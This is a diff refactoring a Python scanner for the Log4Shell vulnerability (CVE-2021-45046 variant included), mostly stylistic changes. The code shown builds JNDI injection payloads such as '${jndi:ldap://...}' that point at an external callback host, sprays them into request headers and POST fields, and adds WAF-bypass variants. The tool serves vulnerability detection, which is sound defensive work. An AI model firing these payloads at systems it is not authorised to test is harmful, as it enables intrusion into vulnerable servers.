@@ -146,24 +146,20 @@ parser.add_argument("--disable-http-redirects",
 args = parser.parse_args()
 
 
-proxies = {}
-if args.proxy:
-    proxies = {"http": args.proxy, "https": args.proxy}
-
-
+proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else {}
 if args.custom_waf_bypass_payload:
     waf_bypass_payloads.append(args.custom_waf_bypass_payload)
 
 
 def get_fuzzing_headers(payload):
     fuzzing_headers = {}
-    fuzzing_headers.update(default_headers)
+    fuzzing_headers |= default_headers
     with open(args.headers_file, "r") as f:
-        for i in f.readlines():
+        for i in f:
             i = i.strip()
             if i == "" or i.startswith("#"):
                 continue
-            fuzzing_headers.update({i: payload})
+            fuzzing_headers[i] = payload
     if args.exclude_user_agent_fuzzing:
         fuzzing_headers["User-Agent"] = default_headers["User-Agent"]
 
@@ -173,10 +169,7 @@ def get_fuzzing_headers(payload):
 
 
 def get_fuzzing_post_data(payload):
-    fuzzing_post_data = {}
-    for i in post_data_parameters:
-        fuzzing_post_data.update({i: payload})
-    return fuzzing_post_data
+    return {i: payload for i in post_data_parameters}
 
 
 def generate_waf_bypass_payloads(callback_host, random_string):
@@ -256,11 +249,11 @@ class Interactsh:
         return json.loads(plain_text[16:])
 
     def __parse_log(self, log_entry):
-        new_log_entry = {"timestamp": log_entry["timestamp"],
-                         "host": f'{log_entry["full-id"]}.{self.domain}',
-                         "remote_address": log_entry["remote-address"]
-                         }
-        return new_log_entry
+        return {
+            "timestamp": log_entry["timestamp"],
+            "host": f'{log_entry["full-id"]}.{self.domain}',
+            "remote_address": log_entry["remote-address"],
+        }
 
 
 def parse_url(url):
@@ -273,7 +266,7 @@ def parse_url(url):
     url = url.replace(' ', '%20')
 
     if ('://' not in url):
-        url = str("http://") + str(url)
+        url = f"http://{str(url)}"
     scheme = urlparse.urlparse(url).scheme
 
     # FilePath: /login.jsp
@@ -289,14 +282,21 @@ def parse_url(url):
 
 def scan_url(url, callback_host):
     parsed_url = parse_url(url)
-    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
+    random_string = ''.join(
+        random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for _ in range(7)
+    )
+
     payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
     payloads = [payload]
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
 
     if args.cve_2021_45046:
-        cprint(f"[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)", "yellow")
+        cprint(
+            "[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)",
+            "yellow",
+        )
+
         payloads = get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{callback_host}', random_string)
 
     for payload in payloads:
@@ -351,7 +351,7 @@ def main():
         urls.append(args.url)
     if args.usedlist:
         with open(args.usedlist, "r") as f:
-            for i in f.readlines():
+            for i in f:
                 i = i.strip()
                 if i == "" or i.startswith("#"):
                     continue
